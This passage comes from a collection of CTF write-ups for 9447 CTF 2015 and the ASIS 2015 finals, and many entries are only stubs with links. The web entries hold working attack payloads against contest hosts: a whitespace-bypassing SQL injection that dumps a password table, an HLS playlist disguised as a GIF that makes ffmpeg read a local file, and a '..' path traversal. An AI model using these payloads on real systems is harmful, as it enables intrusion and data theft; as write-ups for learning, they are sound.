+bash-4.3$ md5 -r pics/* | grep -v 'a8bbd848b849292f9e584276fe4db8ad' | awk '{print $2}' | while read f; do cp "$f" targets/; done                                                                                                                                                                                                                                   
+bash-4.3$ tree targets
targets
├── target-0.png
├── target-1.png
[...]
├── target-81.png
└── target-85.png

0 directories, 26 files
```

Let's run [qrdecode.py](./qrdecode.py) again on the fixed QR decodes to get a hidden hint:

```bash
+bash-4.3$ for i in {0..88}; do [[ -f targets/target-"$i".png ]] && python2.7 qrdecode.py targets/target-"$i".png; done
targets/target-0.png ['two']
targets/target-1.png ['parts']
targets/target-5.png ['all']
targets/target-8.png ['lower']
targets/target-12.png ['add']
targets/target-16.png ['9447{']
targets/target-20.png ['to']
targets/target-21.png ['start']
targets/target-25.png ['and']
targets/target-28.png ['{']
targets/target-32.png ['to']
targets/target-35.png ['the']
targets/target-39.png ['end']
targets/target-43.png ['first']
targets/target-47.png ['looks']
targets/target-48.png ['like']
targets/target-52.png ["'7do'"]
targets/target-55.png ['cut']
targets/target-59.png ['off']
targets/target-63.png ['450ms']
targets/target-67.png ['second']
targets/target-68.png ['like']
targets/target-72.png ['https://www.youtube.com/watch?v=5xxTkB5bGy4']
targets/target-77.png ['like']
targets/target-81.png ['faucet']
targets/target-85.png ['script']
```

As a first hint, we look at [youtube video](https://www.youtube.com/watch?v=5xxTkB5bGy4) that shows us a Tap Dancer.
Given these hints, we find a code named [tap code](https://en.wikipedia.org/wiki/Tap_code) and look at the length of appearance of a given frame:

```bash
+bash-4.3$ for i in {0..88}; do md5 -r "pics/target-$i.png"; done                                                                                                                                                                                                                                                                                                    
fca3afda47eb6351818a39836b638719 pics/target-0.png
6b66d7e0d6d29c7e2f23751afca10d5e pics/target-1.png
a8bbd848b849292f9e584276fe4db8ad pics/target-2.png
a8bbd848b849292f9e584276fe4db8ad pics/target-3.png
a8bbd848b849292f9e584276fe4db8ad pics/target-4.png
06e76fc67f89ac893756b59a1a94e333 pics/target-5.png
a8bbd848b849292f9e584276fe4db8ad pics/target-6.png
a8bbd848b849292f9e584276fe4db8ad pics/target-7.png
3827a3375cce852bbf4e835ebff0da6a pics/target-8.png
a8bbd848b849292f9e584276fe4db8ad pics/target-9.png
a8bbd848b849292f9e584276fe4db8ad pics/target-10.png
a8bbd848b849292f9e584276fe4db8ad pics/target-11.png
[...]
03323555cb7a9c9af0933ad6e2dc7b5c pics/target-77.png
a8bbd848b849292f9e584276fe4db8ad pics/target-78.png
a8bbd848b849292f9e584276fe4db8ad pics/target-79.png
a8bbd848b849292f9e584276fe4db8ad pics/target-80.png
56fbe9555116728e207451eb3d43b463 pics/target-81.png
a8bbd848b849292f9e584276fe4db8ad pics/target-82.png
a8bbd848b849292f9e584276fe4db8ad pics/target-83.png
a8bbd848b849292f9e584276fe4db8ad pics/target-84.png
0e5a5bf5fc79dec20ec46c189c5ff1ff pics/target-85.png
a8bbd848b849292f9e584276fe4db8ad pics/target-86.png
a8bbd848b849292f9e584276fe4db8ad pics/target-87.png
a8bbd848b849292f9e584276fe4db8ad pics/target-88.png
```

The QR Code in `target-0.png` appears for 1 frame, the qr code in `target-1.png` shows for `4` frames in total. `14` in Tapcode is `D`.
Continuing this frame counting method, we get `14 34 44 14 34 34 44 14 34 44 14 54 44`, which is `DOTDOOTDOTDYT`.

One hint in the task description tells us to look at timing.

ImageMagick can also print the [image time delay (in centi-seconds)](http://www.imagemagick.org/script/escape.php) by specifying a format string in ImageMagick's `identify` command:

```bash
:bash-4.3$  identify -format "%s %T\n" gife-489b98cd6221896fa3d10c6dc51e2fb5.gif 
0 50
1 40
2 40
3 50
4 50
5 50
6 50
7 50
8 40
9 40
10 40
[...]
80 50
81 50
82 50
83 50
84 50
85 50
86 40
87 40
88 40
```

There are only two possible values for the delay timing: `400ms` or `500ms`.
One possible option to decode this is translating it from binary to ASCII, another one to see it as morse-code.

The latter is the correct solution:

```bash
+bash-4.3$  identify -format "%T\n" gife-489b98cd6221896fa3d10c6dc51e2fb5.gif | tr -d '0\n' | tr '4' '.' | tr '5' '-' && echo
-..-----...-..--------...-..-----...-..-----...-..--------...-..--------...-..--------...
```

Using only characters `7`, `d` and `o`, as suggested in the QR-decoded message, we get `do7doo7do7do7doo7doo7doo7`.

All that's left to do is concat both hidden messages to get the final flag: `9447{do7doo7do7do7doo7doo7doo7dotdootdotdyt}`

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/steg170-gife-up-now>
* [sophia.re](http://www.sophia.re/94472015_gifeupnow_writeup.html)
# 9447 CTF 2015: imaged

**Category:** Steganography
**Points:** 90
**Solves:** 80
**Description:**

> Our spies found this image. They think something is hidden in it... what could it be?
>
> [imaged.zip](https://mega.nz/#!KYEDhCxT!-ds4cnfwADzH0JxHiokiFXTFSxqddsRqaPmP86ZXDcE)  384077bcc914fd7a2a5afd60c4e4874e


## Write-up

by [stefan2904](https://github.com/stefan2904)

After looking at the provided PNG file with the Hex Editor of our choice, we spotted the sequence *9447*, indicating the start of a flag. Furthermore, we noticed flag-like ascii-characters close to the headers of *IDAT* chunks. (To be precise: the flag-parts were the CRC checksum of the *IDAT* chunks.)

```
0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
0000010: 0000 0bb5 0000 3903 0403 0000 0039 3434  ......9......944
0000020: 3700 0000 3050 4c54 4518 140c f4f0 e8c4  7...0PLTE.......
0000030: 4448 3084 5cf0 e848 3430 74bc 306c 2874  DH0.\..H40t.0l(t
0000040: c400 0000 ffff ffc4 4492 23bc 7287 8569  ........D.#.r..i
0000050: 0603 3830 b08f d486 1f7b 5374 6500 0020  ..80.....{Ste..
0000060: 0049 4441 5478 0100 e880 177f 00c9 e441  .IDATx.........A
0000070: e479 aa92 6193 be9a 1a97 9fa9 9e49 99ae  .y..a........I..
0000080: 949a f999 99af 979b 45ee 9999 99e1 9b71  ........E......q
0000090: a445 4e1a bbaa 7412 4b99 79ee 114b 1921  .EN...t.K.y..K.!
```


After realizing this is also the case for other *IDAT* chunks, a quick python script revealed the rest of the flag:

```python
#!/usr/bin/python

import mmap

with open("imaged.png", "rw+b") as f:
    mm = mmap.mmap(f.fileno(), 0)
    idx = 0
    flag = "9447"
    while '}' not in flag:
        idx = mm.find('IDAT', idx+1)
        flag += mm[idx-8:idx-4]
    print flag
```

9447{Steg0_redunDaNcy_CHeck}

## Other write-ups and resources

* <http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-imaged/>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/steg90-imaged>
* [sophia.re](http://www.sophia.re/94472015_imaged_writeup.html)
* <https://losfuzzys.github.io/writeup/2015/11/30/9447ctf-imaged/>
# 9447 CTF 2015: nicklesndimes

**Category:** Web
**Points:** 200
**Solves:** 67
**Description:**

>  Nick's been eating your grandmother's strombomi. Head over to <http://nicklesndimes-wq3mhu8l.9447.plumbing.> Gain access to his admin account.


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/11/30/9447-ctf-2015-web-200-nicklesndimes-write-up/>
* <http://zoczus.blogspot.de/2015/11/ctf-9447-ctf-web200-nicklesndimes-write.html>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web200-nicklesndimes>
* <https://github.com/asterite3/writeups/blob/master/9447ctf2015/nicklesndimes.md>
# 9447 CTF 2015: premonition

**Category:** Web
**Points:** 140
**Solves:** 121
**Description:**

>  There's been some weird occurrences going on at our school. Teacher's answer questions as though they knew the answer in advance, test results being handed out before the test, and now a weird web form giving info about us. Can you find out what weird information is on it?
> 
> 
>  Find the page at <http://premonition-p8l05mpz.9447.plumbing:9447>


## Write-up

by [f0rki](https://github.com/f0rki)

We got an angular.js app that fetches data via a REST API. We identified the following
valid URLs. 
```
curl "http://premonition-p8l05mpz.9447.plumbing:9447/
    /firstname" -d "firstname=X"
    /lastname" -d "lastname=X"
    /class" -d "class=X"
    /score" -d "score=0&ineq=>"
    /date_birth" -d "date_birth=0&ineq=>"
```
They all give back json data. To shorten the following curl commands:
```
url="http://premonition-p8l05mpz.9447.plumbing:9447/score"
```

We sent the following request, which returns us no results
```
$ curl "$url" -d "score=0&ineq=<"
[]
```
But if we put an extra `'` in there... something strange happens
```
$ curl "$url" -d  "score=0'&ineq=<"
[["Xavier", "Bohm", 95.0, "5A"], ["Mindi", "Cleaves", 94.0, "5J"], ["Ingeborg", "Dunham", 93.0, "5D"], ["Layne", "Agrawal", 94.0, "5K"], ["Kai", "Nathanson", 94.0, "5A"], ["Catharine", "Mcnally", 92.0, "5J"], ["Jeromy", "Duncanson", 92.0, "5D"], ["Lewis", "Oglesbee", 93.0, "5K"], ["Terri", "Colombo", 94.0, "5A"], ["Geraldo", "Penson", 93.0, "5J"], ["Rachael", "Ackermann", 92.0, "5D"], ["Winford", "Hendley", 93.0, "5K"], ["Nella", "Avila", 95.0, "5A"], ["Albertine", "Walmsley", 91.0, "5J"], ["Tyson", "Jefferies", 93.0, "5D"], ["Beulah", "Kaba", 95.0, "5K"], ["Kendra", "Fettig", 94.0, "5A"], ["Kathie", "Bieker", 94.0, "5J"], ["Sharon", "Martelli", 93.0, "5D"], ["Eusebio", "Champagne", 92.0, "5K"], ["Roni", "Neuberger", 93.0, "5A"], ["Kristopher", "Haber", 92.0, "5J"], ["Rubin", "Puryear", 94.0, "5D"], ["Edwina", "June", 95.0, "5K"], ["Imogene", "Burmeister", 91.0, "5A"], ["Jonell", "Dark", 95.0, "5J"], ["Awilda", "Oler", 95.0, "5D"], ["Delbert", "Heminger", 92.0, "5K"], ["Marina", "Lombardi", 93.0, "5A"], ["Katharyn", "Veselka", 92.0, "5J"]]
```
OK so maybe we have some kind of injection vulnerability in the database backend.
Next we tried the `ineq` parameter:
```
$ curl "$url" -d "score=0'&ineq=x"
{"user": "sqliteadmin@localhost", "error": "near \"x\": syntax error"}
```
Oh how nice it seems to be sqlite in the background. And apparently the inequality
operator is just inserted into the raw statement. The score parameter on the other
hand seems to be bound using `?`, like in prepared statements.
```
$ curl "$url" -d "score=95&ineq=<>--x"
```
Gives us an error but 
```
$ curl "$url" -d "score=95&ineq=<>?--x"
```
works just fine. We can also see that whitespace are filtered. So we cannot do something like
```
$ curl "$url" -d "score=100&ineq=>? or 1=1--x"
```
which will result in an error. But then I remebered a neat trick about how to bypass this common
restriction using C-style comments:
```
$ curl "$url" -d "score=100&ineq=>?/**/or/**/1=1--x"
[["Xavier", "Bohm", 95.0, "5A"], ["Mindi", "Cleaves", 94.0, "5J"],  ....
```
Yay we get a list of all students :D So we have a full blown SQL injection.
To make things easier I created a small python function for doing the injections:
```
def inject(x):
    x = x.replace(" ", "/**/")
    print("Injecting: '{}'".format(x))
    resp = requests.post("http://premonition-p8l05mpz.9447.plumbing:9447/score",
                         data={"score": 100, "ineq": x})
    return resp.content
```
Note that `score > 100` will not any results, so we won't get any results from the normal
part of the query.

First thing we managed to dump the schema of the sqlite database:
```
schema = inject(">? union select name, sql, 0, name from sqlite_master--x")
print("got schema:")
schema = json.loads(schema)
for x in schema:
    print("table", x[0], "created with:\n", x[1])
```
We get the following output:
```
Injecting: '>?/**/union/**/select/**/name,/**/sql,/**/0,/**/name/**/from/**/sqlite_master--x'
got schema:
table s3ekr17_passwords created with:
 CREATE TABLE s3ekr17_passwords(
	userid real,
	password text
)
table students created with:
 CREATE TABLE students(
	userid real,
	firstname text,
	lastname text,
	score real,
	teacher real,
	class text,
	date_birth date,
	date_death date
)
```

So the flag is probably in the `s3ekr17_passwords` table. We can just get the contents using
a union select. Turns out each of the passwords of the users was a part of the flag and the
userid was the position of the character. So we just appended an `order by` and joined the
flag by parsing the json output.
```
x = inject(">? union select password, password, userid, password from s3ekr17_passwords order by userid--x")
print(x)
data = json.loads(x)
flag = "".join(x[0] for x in data)
print("the flag is:")
print(flag)
```
We get the following output:
```
Injecting: '>?/**/union/**/select/**/password,/**/password,/**/userid,/**/password/**/from/**/s3ekr17_passwords/**/order/**/by/**/userid--x'
[["9", "9", 0.0, "9"], ["4", "4", 1.0, "4"], ["4", "4", 2.0, "4"], ["7", "7", 3.0, "7"], ["{", "{", 4.0, "{"], ["u", "u", 5.0, "u"], ["S", "S", 6.0, "S"], ["e", "e", 7.0, "e"], ["r", "r", 8.0, "r"], ["A", "A", 9.0, "A"], ["g", "g", 10.0, "g"], ["e", "e", 11.0, "e"], ["n", "n", 12.0, "n"], ["T", "T", 13.0, "T"], ["s", "s", 14.0, "s"], ["_", "_", 15.0, "_"], ["a", "a", 16.0, "a"], ["N", "N", 17.0, "N"], ["d", "d", 18.0, "d"], ["_", "_", 19.0, "_"], ["s", "s", 20.0, "s"], ["p", "p", 21.0, "p"], ["a", "a", 22.0, "a"], ["C", "C", 23.0, "C"], ["e", "e", 24.0, "e"], ["s", "s", 25.0, "s"], ["_", "_", 26.0, "_"], ["a", "a", 27.0, "a"], ["R", "R", 28.0, "R"], ["e", "e", 29.0, "e"], ["_", "_", 30.0, "_"], ["p", "p", 31.0, "p"], ["e", "e", 32.0, "e"], ["a", "a", 33.0, "a"], ["s", "s", 34.0, "s"], ["A", "A", 35.0, "A"], ["n", "n", 36.0, "n"], ["t", "t", 37.0, "t"], ["_", "_", 38.0, "_"], ["R", "R", 39.0, "R"], ["a", "a", 40.0, "a"], ["c", "c", 41.0, "c"], ["E", "E", 42.0, "E"], ["s", "s", 43.0, "s"], ["}", "}", 44.0, "}"]]

the flag is:
9447{uSerAgenTs_aNd_spaCes_aRe_peasAnt_RacEs}
````

## Other write-ups and resources

* <http://mumei.strangled.net/post/3> (spanish)
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web140-premonition>
* <https://asciinema.org/a/30878>
* <http://secgroup.github.io/2015/11/30/9447ctf2015-writeup-premonition/>
* <http://pastebin.com/NCSv5qpW>
* <https://pony7.fr/ctf:public:9447:premonition>
* [sophia.re](http://www.sophia.re/94472015_premonition_writeup.html)
* <https://losfuzzys.github.io/writeup/2015/12/07/9447ctf-premonition/>
# 9447 CTF 2015: sanutf8y_check

**Category:** Web
**Points:** 1
**Solves:** 412
**Description:**

> Visit <http://sanutf8y-check-n2wisexx.9447.plumbing> for the flag.
> 
> Hint! The flag is in the format 9447{[a-zA-Z0-9_]*}


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2015-11-28-9447/sanutf8y_check#eng-version>
* <http://rotiples.tistory.com/41>
* <https://gist.github.com/Invizory/d44cb90e4605eb911bfe>
* <https://github.com/ubuntor/misc_writeups/tree/master/9447ctf2015>
# 9447 CTF 2015: Super Turbo Atomic GIF Converter

**Category:** Web
**Points:** 180
**Solves:** 9
**Description:**

>  Kids these days like fancy web video instead of gifs, so I made a converter.
> 
>  Flag is /home/ctf/flag.txt
> 
>  Find it at <http://superturboatomicgifconverter.9447.plumbing:9447>
> 
>  08:00 UTC: The source code has been released.
> 
>  Hint! The source code has been released for this task.
> 
> [srv.py](./srv-626b48e5cf41be2ffb02f89b823c2c5f.py)  626b48e5cf41be2ffb02f89b823c2c5f


## Write-up

by [f0rki](https://github.com/f0rki)

When I started working on the challenge, the source was already released and we were
give the hint that the flag is in `/home/ctf/flag.txt`. 

The first   thing I did was take a look at the source code. It's a pretty small web 
service written in python using flask. It converts a .gif file you send it to a webm 
file and sends it back to the client. The converted file is removed after the client 
received it. Actually you can upload any file that ffmpeg can read and ends with `.gif` 
and ffmpeg will happily convert it for you. ffmpeg probes the files for certain magic 
values to detect the filetype.

The first thing I noticed was that they use a custom compiled version of ffmpeg:
```
FFMPEG = "ffmpeg-2.8.2-64bit-static/ffmpeg"
```
Why did they compile it themselves? Do we need to do RCE? So I searched for a known 
vulnerabilities. According to the [ffmpeg security page](https://ffmpeg.org/security.html)
version 2.8.2 is vulnerable to three different CVEs. I couldn't find any details on
the vulnerabilities or ready exploits. Also it's a web challenge so it seemed
unlikely that we have to write an exploit for ffmpeg. 

So I turned back to the flask part. The execution of shell commands seemed safe and
after spending soeme time playing around with path traversal attempts in the filenames
I decided that's a dead end. The problem must be with ffmpeg.

A colleague reminded me that in svg files you can include other files, so I started poking
in that direction. Unfortunately ffmpeg doesn't support reading svg files, so I took a look
at all the [supported input files of ffmpeg](https://ffmpeg.org/ffmpeg-formats.html#Demuxers).

So I noticed the `concat` demuxer at first. It takes a textfile as input. This file contains
script like instructions for concatenating multiple files: e.g.
```
ffconcat version 1.0
file '/home/ctf/flag.txt'
```
Unfortunately the concat demuxer doesn't allow 'unsafe' files in the input file. Files are
considered unsafe if they contain a `/` at the start or if they contain anything other than
`[A-Za-z0-9-_]`. I started trying different inputs, putting `NULL` bytes in the path, etc.
But the [filename checker](https://github.com/FFmpeg/FFmpeg/blob/n2.8.2/libavformat/concatdec.c#L84) 
seems rather safe. Dead end again. But fortunately more file formats :)
I started looking at the `matroska` format and if there is a way to embed subtitles from
text files or something like that, but then another demuxer hit my eye.

The [applehttp or hls](http://www.ffmpeg.org/ffmpeg-formats.html#applehttp) demuxer for 
HTTP Live Streaming playlists. I searched for an example of this file format and copy 
pasted [this example from apple](https://developer.apple.com/library/ios/technotes/tn2288/_index.html).
Maybe ffmpeg can also open `file://` URLs. So I just gave it a try, with the following content
for my `wat.gif`:
```
#EXTM3U
#EXT-X-PLAYLIST-TYPE:VOD
#EXT-X-TARGETDURATION:1
#EXT-X-VERSION:3
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
file:///home/ctf/flag.txt
#EXT-X-ENDLIST
```

I uploaded it and got the following result:
![screnenshot: got the flag](flag.png "converted flag")
yay got it! Although given the flag I wonder if this really is the intended solution.


## Other write-ups and resources

* <http://www.kernelpicnic.net/2015/11/29/9447CTF-Super-Turbo-Atomic-GIF-Converter-Write-Up.html>
* <https://github.com/pwning/public-writeup/tree/master/9447ctf2015/web180-gif-converter>
* <https://losfuzzys.github.io/writeup/2015/12/07/9447ctf-super-turbo-atomic-gif-converter/>
* <http://pastebin.com/FrsQinQz>
* <https://gist.github.com/Invizory/e45e1ee54cf0687f2002>
# 9447 CTF 2015: YWS

**Category:** Web
**Points:** 130
**Solves:** 197
**Description:**

> My friend wrote a cool web server. I'm sure he's stored some great doxxxs on the website. Can you take a look and report back any interesting things you find?
> 
> The web page is at <http://yws-fsiqc922.9447.plumbing>
> 
> Hint! Where does the website *not* want you to go?


## Write-up

by [f0rki](https://github.com/f0rki)

We poked around a lot at this challenge. Tried several different inputs and URLs. Only
later we realized that we could have looked at the binary of [BWS](/9447-ctf-2015/exploitation/bws)
We realized that there was something funky going on regarding the filtering of the
paths. So after poking around a little bit, I found that the following works:
```
import requests as r
print(r.get("http://yws-fsiqc922.9447.plumbing/..").content)
```
And we got back the directory listing contains the flag.
```
<html>
<head>
<title>Directory listing for /..</title>
</head>
<body>
<h2>Directory listing for /..</h2>
<hr>
<ul>
<li><a href="/../.">.</a>
<li><a href="/../..">..</a>
[...]
<li><a href="/../9447{D1rect0ries_ARe_h4rd}">9447{D1rect0ries_ARe_h4rd}</a>
[...]
</ul>
<hr>
</body>
</html>
```

Apparently the webserver filtered out `../` but not `..`. We had troubles 
using the browser or curl to fetch this. Probably because they automatically 
append a `/` character or something like that.

## Other write-ups and resources

* <http://blog.jclariviere.com/posts/ctf-writeup-9447-ctf-2015-yws/>
* <https://asciinema.org/a/30881>
* <http://pastebin.com/jzd6DVMu>
* <https://gist.github.com/Invizory/7772c252b35c1bc95e6b>
* [sophia.re](http://www.sophia.re/yws.mdown.html)
# ASIS Cyber Security Contest 2015: 10-sed

**Category:** crypto
**Points:** 175
**Solves:** 11
**Description:**

> Break crypto system and find the flag.
> 
> nc 94.182.227.61 31337

## Write-up

(TODO)

## Other write-ups and resources

* http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-10-sed-crypto-175/
* https://kt.pe/blog/2015/10/asis-2015-finals-10-sed/
# ASIS Cyber Security Contest 2015: bodu

**Category:** crypto
**Points:** 175
**Solves:** 47
**Description:**

> Decrypt the message!

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-bodu/
# ASIS Cyber Security Contest 2015: giloph

**Category:** crypto
**Points:** 300
**Solves:** 11
**Description:**

> Break crypto system and find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-giloph-crypto-300/
* https://kt.pe/blog/2015/10/asis-2015-finals-giloph/
# ASIS Cyber Security Contest 2015: honeywall

**Category:** crypto
**Points:** 250
**Solves:** 21
**Description:**

> See code and find flag!
> 
> nc 94.182.227.61 31313

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-honeywall/
# ASIS Cyber Security Contest 2015: RSASR

**Category:** crypto
**Points:** 300
**Solves:** 4
**Description:**

> Find the message!

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-rsasr/
# ASIS Cyber Security Contest 2015: simple

**Category:** crypto
**Points:** 75
**Solves:** 27
**Description:**

> Decrypt message!

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-simple/
# ASIS Cyber Security Contest 2015: the-last-survivor

**Category:** crypto
**Points:** 250
**Solves:** 1
**Description:**

> Decrypt the message

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest 2015: big-lie

**Category:** forensic
**Points:** 100
**Solves:** 101
**Description:**

> Find the flag.

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups (You should have a look at them to see the now deleted paste links):

* <https://github.com/bl4de/ctf/blob/master/ASIS_CTF_2015/Biglie_Forensic_100_writeup.md>
* <http://www.nusgreyhats.org/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)/>
* <https://kt.pe/blog/2015/10/asis-2015-finals-biglie/>
* <http://tontonsfl4ggeurs.github.io/ASIS/>

We are given xz compressed data, which contains a tar, which again contains a pcap dump:

```bash
+bash-4.3$ file biglie_33da1c4341bdd33d2847cf7ea2657e42 
biglie_33da1c4341bdd33d2847cf7ea2657e42: xz compressed data
+bash-4.3$ mv biglie_33da1c4341bdd33d2847cf7ea2657e42{,.xz}
+bash-4.3$ unxz biglie_33da1c4341bdd33d2847cf7ea2657e42.xz 
+bash-4.3$ !file
file biglie_33da1c4341bdd33d2847cf7ea2657e42 
biglie_33da1c4341bdd33d2847cf7ea2657e42: POSIX tar archive (GNU)
+bash-4.3$ tar xvf biglie_33da1c4341bdd33d2847cf7ea2657e42 
x biglie.pcap
+bash-4.3$ file biglie.pcap 
biglie.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

Looking closer at the HTTP requests, we see that a POST-Request to <http://0bin.asis.io/> is called:

![](./post-0bin.png)

0bin here is a client-side encrypted pastebin, which also is [open-source](https://github.com/sametmax/0bin).

If you upload a file or text on <http://0bin.asis.io/>, your browser encrypts the content, submits the encrypted content with an IV and salt to the server.

Following that, you'll be redirected to a paste link that looks like the following:

    http://0bin.asis.io/paste/<paste-hash>#<secret>

The secret after the [location hash](http://www.w3schools.com/jsref/prop_loc_hash.asp) (`#`) is needed to decrypt the content and is not sent to the server, i.e. only visible in the browser.

However, a web statistic tool called `piwik` is used, which sends the complete url to a php script `piwik.php`, including the secret key.

To get the flag, we visit all three 0bin paste links with the correct secret keys to finally see an ASCII art representing the flag.

The flag is `ASIS{e29a3ef6f1d71d04c5f107eb3c64bbbb}`.

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-biglie/>
* <http://www.nusgreyhats.org/write-ups/ASISCTF-Final-2015-Big-Lie-(Forensics-100)/>
* <https://github.com/bl4de/ctf/blob/master/ASIS_CTF_2015/Biglie_Forensic_100_writeup.md>
* <http://tontonsfl4ggeurs.github.io/ASIS/>
* <https://www.mma.club.uec.ac.jp/tokyowesterns/Writeup/ASIS%20CTF%20Final%202015#Big_Lie>
# ASIS Cyber Security Contest 2015: iosdump

**Category:** forensic
**Points:** 150
**Solves:** 0
**Description:**

> Find the flag. [http://tasks2015.asis-ctf.ir/iosdump_59a0829c9ed13248a95626130045a13e](https://mega.nz/#!iBFBiKJA!B7DZifpA2Xt3KXmW5zEVXu6xoNodXGwhH7Zw0BxlPE8)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest 2015: MBTI

**Category:** forensic
**Points:** 200
**Solves:** 5
**Description:**

> test your personality and tell me about mine.

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-mbti/
# ASIS Cyber Security Contest 2015: particles

**Category:** forensic
**Points:** 175
**Solves:** 9
**Description:**

> I had a bet with Gordon Kane of Michigan University that the Higgs particle wouldn't be found.
> 
> - Stephen Hawking

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writups:

* <https://kt.pe/blog/2015/10/asis-2015-finals-particles/>
* <https://www.ibrahim-elsayed.com/?p=124>

We are given a xz compressed tar archive that we extract using `unxz` and `tar xvf` to find a tcpdump capture file:

```bash
$ file particles.pcap
particles.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

Opening the pcap using `wireshark` reveals that `zsync` was used to transfer files between two machines.

The header of each `zsync` request and response looks like this:

![](./wireshark-zsync.png)

We can see a SHA-1 hashsum of the file transferred.

All in all, 6 files have been transmitted:

```bash
$ strings particles.pcap | grep SHA-1 
SHA-1: 9be3800b49e84e0c014852977557f21bcde2a775
SHA-1: e227c6d298358d53374decb9feaacb463717e2d9
SHA-1: 2d27f6e5bafdf23c7a964a325ebf3a5ee9ca4b18
SHA-1: 8f1fa762c3bf865d0298e7a8fd3640c606962122
SHA-1: 7e05370d87196157bc35f920d7fcf27668f8e8af
SHA-1: e8c7d65370947b40418af55bdc0f65e06b7b0c59
```

Searching for these hashsums we finally find a [malware analysis result](https://www.hybrid-analysis.com/sample/688a3ac91914609e387111e6382911ecd0aefe9f4f31bed85438b65af390cf6f?environmentId=2) that contains a screenshot with the flag:

![](./screen_0.png)

The flag is `ASIS{c295c4f709efc00a54e77a027e36860c}`.

The actual and intended solution is to reassemble the files transmitted [as this writeup describes](https://kt.pe/blog/2015/10/asis-2015-finals-particles/) and run one of these files, a PE executable, to get the flag.

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-particles/>
* <https://www.ibrahim-elsayed.com/?p=124>
# ASIS Cyber Security Contest 2015: strange

**Category:** forensic
**Points:** 150
**Solves:** 23
**Description:**

> I lost my glasses! help me!!

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-strange/>
* <https://kt.pe/blog/2015/10/asis-2015-finals-strange/>
* <https://github.com/p4-team/ctf/tree/master/2015-10-10-asisfin/forensic_150_strange#user-content-eng-version>
# ASIS Cyber Security Contest 2015: flag-hunter

**Category:** misc
**Points:** 75
**Solves:** 53
**Description:**

> Be a hunter and find the flag.(http://flaghunt.asis-ctf.ir/)

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-flaghunter/
# ASIS Cyber Security Contest 2015: meow-meow

**Category:** misc
**Points:** 75
**Solves:** 75
**Description:**

> What is my little kitty saying?

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-meow-meow/
# ASIS Cyber Security Contest 2015: missing-rings

**Category:** misc
**Points:** 150
**Solves:** 0
**Description:**

> Find the flag.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# ASIS Cyber Security Contest 2015: calcexec-1

**Category:** pwn
**Points:** 200
**Solves:** 7
**Description:**

> 2+2 == 5?
> 
> nc 185.82.202.146 1337

## Write-up

(TODO)

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-calcexe-1/>
* <https://github.com/p4-team/ctf/tree/master/2015-10-10-asisfin/pwn_200_calcexec_I#eng-version>
* <https://www.mma.club.uec.ac.jp/tokyowesterns/Writeup/ASIS%20CTF%20Final%202015>
# ASIS Cyber Security Contest 2015: calcexec-2

**Category:** pwn
**Points:** 250
**Solves:** 5
**Description:**

> 2+2 == 5? Pop a shell!
> 
> nc 185.82.202.146 1337

## Write-up

(TODO)

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-calcexe-2/>
* <https://www.mma.club.uec.ac.jp/tokyowesterns/Writeup/ASIS%20CTF%20Final%202015>
# ASIS Cyber Security Contest 2015: png2ppm

**Category:** pwn
**Points:** 450
**Solves:** 6
**Description:**

> In our cloud-base era, big enterprises realized they have to outsource their daily resource intensive jobs. Like converting their PNGs to PPMs, which is an easily readable text-based image format, especially compatible for storing in their Word documents.
> 
> As we don't want to miss out this profitable business opportunity, we created our image conversion service, written in C which guarantees fast response times thus customer satisfaction. Please feel free to try out our beta.
> 
> Ps: we got some inquiries about the security of our product. Our product is using state-of-art security mechanisms of course to keep everybody's data totally secure. You don't have to worry that anything will leak from us!
> 
> Here you can see that every protected is on and running:
> 
> nc 185.106.120.22 1337

## Write-up

(TODO)

## Other write-ups and resources

* https://kt.pe/blog/2015/10/asis-2015-finals-png2ppm/
# ASIS Cyber Security Contest 2015: shop-1

**Category:** pwn
**Points:** 100
**Solves:** 34
**Description:**

> Our marvelous Bragisdumus shop just opened. Come and see our beautiful Bragisdumus!
> 
> Login as an admin! get the admin password.
> 
> nc 185.106.120.220 1337

## Write-up

(TODO)

## Other write-ups and resources

* <https://kt.pe/blog/2015/10/asis-2015-finals-shop-1/>
* <http://tlk.tuxfamily.org/doku.php?id=writeup:asis:shop_1_2>
* <http://nandynarwhals.org/2015/10/13/asis-ctf-finals-2015-shop-1-pwn/> (down)
